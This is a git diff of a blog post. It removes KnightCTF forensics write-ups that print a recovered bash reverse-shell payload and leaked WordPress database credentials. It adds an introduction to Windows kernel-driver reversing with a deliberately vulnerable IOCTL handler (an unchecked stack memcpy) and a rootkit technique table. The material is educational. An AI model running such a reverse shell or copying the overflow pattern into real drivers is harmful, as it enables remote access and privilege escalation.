@@ -2,204 +2,404 @@
 title: 'KnightCTF Writeups'
 description: 'having fun'
 pubDate: 'Jan 20 2026'
-cover: /images/knightctf.png
+cover: /images/kernelrev.png
 categories: ['Blog']
 tags: ['rev']
 ---
 
 
-This CTF was a great experience overall. I played it with Hack@Sec, and we were honestly just chilling and practicing, using these challenges to sharpen our skills and prepare seriously for 2026. Even though the atmosphere was relaxed have fun reading ...
+Here’s something interesting I’ve been learning about lately. I’m still far from mastering it Windows kernel-mode reversing is honestly an ocean lmao. The deeper you go, the more you realize how much there is left to explore. This post is just a snapshot of what I’ve discovered so far while diving into kernel land
 
 
 
 
 
-## 1) KCTF – Database Credentials Theft
 
-Category: Forensics 
 
-## 2) Challenge Description
 
-After gaining shell access, the attacker performed post-exploitation and extracted database credentials from the compromised server.
 
-Using **pcap3.pcapng**, recover:
 
->Database username
 
->Database password
+## Windows Kernel Modulo Reversing: A Deep Technical Introduction
 
-Flag format:
+`“User mode reversing teaches you how programs work. Kernel modulo reversing teaches you how the operating system really works.”`
 
-KCTF{username_password}
+## 1. Introduction — What is Kernel Modulo Reversing?
 
-## 3) Executive Summary
+Windows kernel modulo reversing is the process of analyzing, understanding, and debugging code that runs in Ring 0, the most privileged execution level of the CPU.
 
-By reconstructing the reverse shell session over TCP, we observed the attacker dumping a WordPress configuration file, exposing the database credentials.
+Unlike classic reversing of .exe files, kernel reversing focuses on:
 
-Recovered:
+>Windows kernel (`ntoskrnl.exe`)
+
+>Core subsystems (`win32k.sys`, `hal.dll`)
+
+>Device drivers (`*.sys`)
+
+>Security and anti-cheat drivers
+
+>Rootkits and stealth malware
+
+Kernel mode code has:
+
+>No Win32 API
+
+>Direct access to hardware, memory, processes, and the scheduler
+
+>The power to fully control or compromise the system
+
+A single bug in kernel mode is often enough to:
+
+>Escalate privileges to NT AUTHORITY\SYSTEM
+
+>Bypass security boundaries
+
+>Hide processes, files, or network traffic
+
+>Completely crash the OS (BSOD)
+
+This is why kernel reversing is central in:
+
+>Malware research
+
+>EDR / anti-cheat analysis
+
+>Windows exploit development
+
+>Advanced CTF challenges
+
+
+## 2. Windows Architecture Refresher
+
+Windows is split into two main execution layers : 
+
+
+```scss
+
+User Mode (Ring 3)
+  ├─ Applications
+  ├─ services.exe
+  ├─ browsers, games, malware.exe
+  └─ ntdll.dll
+
+Kernel Mode (Ring 0)
+  ├─ ntoskrnl.exe  (core kernel)
+  ├─ win32k.sys   (GUI subsystem)
+  ├─ hal.dll      (hardware abstraction)
+  └─ drivers (*.sys)
+```
+
+User-mode code cannot directly:
+
+>Access physical memory
+
+>Touch kernel structures
+
+>Control hardware
+
+>Manage scheduling
+
+All sensitive operations transition into kernel mode via:
+
+>`syscall / sysenter`
+
+>Interrupts
+
+>I/O requests (IRPs)
+
+Reversing kernel mode means understanding what happens after this boundary.
+
+
+## 3. What Is a Windows Driver Internally?
+
+A Windows driver is just a PE file `(.sys)` loaded into kernel space.
+
+Its entry point is not `main()` but:
+
+```c
+
+NTSTATUS DriverEntry(
+    PDRIVER_OBJECT  DriverObject,
+    PUNICODE_STRING RegistryPath
+);
+
+
+```
+
+This function:
+
+>Initializes the driver
+
+>Registers callbacks
+
+>Creates device objects
+
+>Sets up IRP dispatch routines
+
+Example skeleton:
+
+```c
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    DriverObject->DriverUnload = DriverUnload;
+
+    DriverObject->MajorFunction[IRP_MJ_CREATE]  = DispatchCreate;
+    DriverObject->MajorFunction[IRP_MJ_CLOSE]   = DispatchClose;
+    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
+
+    return STATUS_SUCCESS;
+}
+```
+
+From a reversing perspective, this function is your **main()**.
+
+
+## 4. IRPs — How User Mode Talks to Kernel Mode
+
+All communication is done using IRPs (I/O Request Packets).
+
+Typical flow:
 
 ```bash
-Username: wpuser
 
-Password: wp@user123
+Userland app → DeviceIoControl()
+               ↓
+        I/O Manager
+               ↓
+        IRP_MJ_DEVICE_CONTROL
+               ↓
+        Driver Dispatch Routine
 ```
 
-✅ Flag:
+Example vulnerable handler:
+
+```c
+NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+{
+    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
+    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;
+
+    if (code == 0x222003)
+    {
+        char kernel_buf[0x100];
+        memcpy(kernel_buf,
+               Irp->AssociatedIrp.SystemBuffer,
+               stack->Parameters.DeviceIoControl.InputBufferLength); //  bug
+    }
+
+    Irp->IoStatus.Status = STATUS_SUCCESS;
+    IoCompleteRequest(Irp, IO_NO_INCREMENT);
+    return STATUS_SUCCESS;
+}
+```
+
+
+In reversing:
+
+>You hunt for IRP_MJ_DEVICE_CONTROL
+
+>Then rebuild the IOCTL protocol
+
+>Then find bugs → exploitation → SYSTEM
+
+
+## 5. What You Reverse in Practice
+
+Kernel reversing usually targets:
+
+### 1 Malware drivers
+
+>Process hiding (DKOM)
+
+>SSDT hooks
+
+>Object callbacks
+
+>Rootkits
+
+### 2 Anti-cheat / EDR
+
+>Syscall filtering
+
+>Memory scanning
+
+>Hypervisor interfaces
+
+### 3 Vulnerable drivers
+
+>Stack overflow
+
+>Pool overflow
+
+>Arbitrary R/W
+
+>Privilege escalation
+
+### 4 Windows internals
+
+>Process manager
+
+>Memory manager
+
+>Object manager
+
+
+## 6. Kernel Reversing Toolchain
+
+Static analysis
+
+>IDA Pro 
+
+>Ghidra
+
+>Binary Ninja
+
+>and the best one is [dogbolt](https://https://dogbolt.org/)  ***lmaaaaaaaaao***
+
+Load drivers with symbols:
 
 ```bash
-KCTF{wpuser_wp@user123}
+
+srv*C:\symbols*https://msdl.microsoft.com/download/symbols
+
 ```
 
-### Step 1 – Locate Reverse Shell Traffic
 
-Apply filter:
+Symbols turn this:
 
 ```bash
-tcp.port == 9576
+sub_140003AF0
 ```
 
-Right-click a packet →
-Follow → TCP Stream
-
-This reconstructs the entire attacker shell session.
-
-### Step 2 – Analyze Post-Exploitation Commands
-
-Inside the stream:
-
-```ruby
-www-data@victim:/var/www/html$ ls
-index.php wp-config.php ...
-
-www-data@victim:/var/www/html$ cat wp-config.php
-```
-
-Captured output:
-
-```ruby
-define( 'DB_USER', 'wpuser' );
-define( 'DB_PASSWORD', 'wp@user123' );
-```
-
-Credentials were transmitted in clear-text.
-
-### Step 3 - Final Flag
- 
-**KCTF{wpuser_wp@user123}**
-
-
-
- ## 1) KCTF – Post Exploitation
-
-Category: Forensics 
-
-
-## 2) Challenge Description
-
-After exploiting a vulnerability, the attacker:
-
->Downloaded an initial payload from an HTTP server
-
->Established a persistent reverse shell connection
-
-Using **pcap3.pcapng**, identify:
-
->The HTTP port used for payload delivery
-
->The port used for the reverse shell
-
-Flag format:
+into this:
 
 ```bash
-KCTF{httpPort_revshellPort}
-
+PsCreateProcessNotifyRoutine
 ```
 
- ## 3) Executive Summary
+**Which is gold in kernel reversing**.
 
-By analyzing suspicious HTTP traffic and long-lived TCP sessions, we identified:
 
-A malicious Python HTTP server delivering a payload on port 8767
+### Dynamic analysis 
 
-A reverse shell connecting back on port 9576
+Kernel debugging is not optional.
 
-Flag:
+Setup:
+
+>VMware / Hyper-V
+
+>Target VM: kernel debug enabled
+
+>Host: WinDbg
+
 
 ```bash
-KCTF{8767_9576}
+bcdedit /debug on
+bcdedit /set testsigning on
 ```
 
-### Step 1 – Inspecting the PCAP
+Then attach WinDbg kernel debugger.
 
-Open the capture:
+Core commands:
+
 
 ```bash
-wireshark pcap3.pcapng
+lm            // list drivers
+!drvobj       // inspect driver
+!process 0 1  // active processes
+dt _EPROCESS  // kernel structures
 ```
 
-Check conversations:
+## 7. Core Kernel Concepts You Must Reverse
 
-```bash
-Statistics → Conversations → TCP
+**Kernel objects**
+
+>`_EPROCESS` (process)
+
+>`_ETHREAD` (thread)
+
+>`_DRIVER_OBJECT`
+
+>`_DEVICE_OBJECT`
+
+**Memory**
+
+>NonPagedPool
+
+>MDLs
+
+>IRQL levels
+
+>Page tables
+
+
+**Callbacks**
+
+```c
+PsSetCreateProcessNotifyRoutine(...)
+ObRegisterCallbacks(...)
+CmRegisterCallback(...)
 ```
 
-Two anomalies appear:
-
->Short HTTP exchanges on TCP/8767
-
->A persistent bidirectional session on TCP/9576
+**Malware loves them , and yeah, I can’t lie… I love them too**
 
 
-### Step 2 – Finding the Payload Server
+## 8. Typical Kernel Rootkit Techniques
 
-Apply filter:
+| Technique        | Purpose                |
+| ---------------- | ---------------------- |
+| SSDT hooking     | syscall interception   |
+| Inline hooks     | stealth monitoring     |
+| DKOM             | hide processes/drivers |
+| Callbacks        | monitor activity       |
+| Filter drivers   | hide files/registry    |
+| Hypervisor abuse | evade kernel itself    |
 
-```bash
-tcp.port == 8767 && http
+Kernel reversing is learning to recognize these patterns in assembly.
 
-```
+## 9. Reversing Methodology
 
-Observed request:
+1. Load .sys in IDA
 
-```bash
-GET /payload.txt?swp_debug=get_user_options HTTP/1.1
-Host: 192.168.1.104:8767
+2. Find DriverEntry
 
-```
+3. Rebuild DRIVER_OBJECT
 
-Response server:
+4. Locate:
 
-```bash
-SimpleHTTP/0.6 Python/3.13.1
+>Dispatch routines
 
-```
-Payload content:
+>IOCTL switch
 
-```bash
-system("bash -c \"bash -i >& /dev/tcp/192.168.1.104/9576 0>&1\"")
+>Callbacks
 
-```
+5. Rename everything
 
-Confirms malicious payload hosting.
+6. Attach WinDbg
 
-### Step 3 – Identifying the Reverse Shell Port
+7. Trace IRPs
 
-Filter:
+8. Observe kernel memory
 
-```bash
-tcp.port == 9576
-```
+9. Confirm behavior dynamically
 
-Follow TCP stream → reveals a fully interactive shell session:
+This is where reversing becomes OS archaeology.
 
-```bash
-www-data@victim:/var/www/html$ whoami
-www-data
-```
-Confirms a reverse shell channel.
+## 10. Conclusion
 
- Final Flag
+Windows kernel-mode reversing is where reverse engineering stops being about binaries — and becomes about operating system internals, security boundaries, and hardware control.
 
- ```bash
-KCTF{8767_9576}
-```
+It’s the foundation of:
+
+>Modern malware research
+
+>Kernel exploit development
+
+>EDR and anti-cheat analysis
+
+>Advanced digital forensics
+
+**Mastering it means understanding Windows not as a user but as the system itself**.
